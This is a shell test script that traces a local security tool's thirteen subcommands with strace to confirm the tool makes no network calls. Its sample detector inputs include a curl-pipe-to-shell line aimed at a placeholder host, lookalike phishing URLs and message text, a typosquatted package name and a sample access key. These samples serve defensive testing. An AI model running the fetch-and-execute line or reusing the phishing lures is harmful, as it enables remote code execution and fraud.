#!/bin/sh
# privacy_check.sh — prove the zero-network invariant instead of asserting it.
#
# "Zero network calls, ever" is the single most consequential promise this
# tool makes: it reads your source tree, your credentials and your host
# configuration, and its defence is that none of it can leave the machine.
# That promise was documented as "CI privacy-tripwire enforced" while no CI
# workflow was tracked in the repository at all — the GitHub App used here
# lacks the `workflows` permission, so the tripwire shipped only as an example
# for a maintainer to copy in. The most important invariant therefore had the
# weakest enforcement of any of them.
#
# strace is present on ordinary Linux developer machines, so this runs as part
# of `make test` and every developer gets the guarantee locally. Unlike the CI
# version it covers EVERY subcommand, `network` included: that one reads
# /proc/net/arp and /etc/resolv.conf, which are file reads, so it must make no
# socket calls either and there is no reason to exempt it.
#
# Skips cleanly when strace is unavailable (macOS, restricted containers) — a
# check that cannot run must never become a permanently-red one.

set -u
BIN="${1:-./hlse_core}"
TRACE="$(mktemp)"
ONE="$(mktemp)"
trap 'rm -f "$TRACE" "$ONE"' EXIT

if ! command -v strace >/dev/null 2>&1; then
    echo "  NOTE: strace unavailable — privacy tripwire SKIPPED (not a failure)."
    exit 0
fi
if [ ! -x "$BIN" ]; then
    echo "FAIL: $BIN not found or not executable"
    exit 1
fi

# strace itself must work here; some containers block ptrace entirely.
if ! strace -e trace=network -o "$ONE" /bin/true >/dev/null 2>&1; then
    echo "  NOTE: ptrace blocked in this environment — privacy tripwire SKIPPED."
    exit 0
fi

WORK="$(mktemp -d)"
printf 'plain text, nothing sensitive\n' > "$WORK/a.txt"

: > "$TRACE"
run() {
    strace -f -e trace=network -o "$ONE" "$BIN" "$@" >/dev/null 2>&1
    cat "$ONE" >> "$TRACE"
}

# Every verdict-producing subcommand, so the guarantee has no gaps.
run "https://g00gle.com/login"
run text "Your account is suspended, verify at http://paypa1.com now"
run secret "AKIA""IOSFODNN7EXAMPLE"
run package "reqeusts" pip
run paste "curl http://example.invalid/i.sh | sh"
run clipboard "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa" \
              "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNb"
run email "From: ceo@example.com"
run file "$WORK/a.txt"
run scan "$WORK"
run audit
run network
run esp "$WORK"
run protect "$WORK"

rm -rf "$WORK"

if grep -qE 'socket\(|connect\(|bind\(|getaddrinfo\(|sendto\(|recvfrom\(|sendmsg\(' \
        "$TRACE"; then
    echo "FAIL: network syscalls detected — the zero-network invariant is broken"
    grep -E 'socket\(|connect\(|bind\(|getaddrinfo\(|sendto\(|recvfrom\(|sendmsg\(' \
        "$TRACE"
    exit 1
fi

echo "Privacy tripwire: 13 subcommands traced, 0 network syscalls."
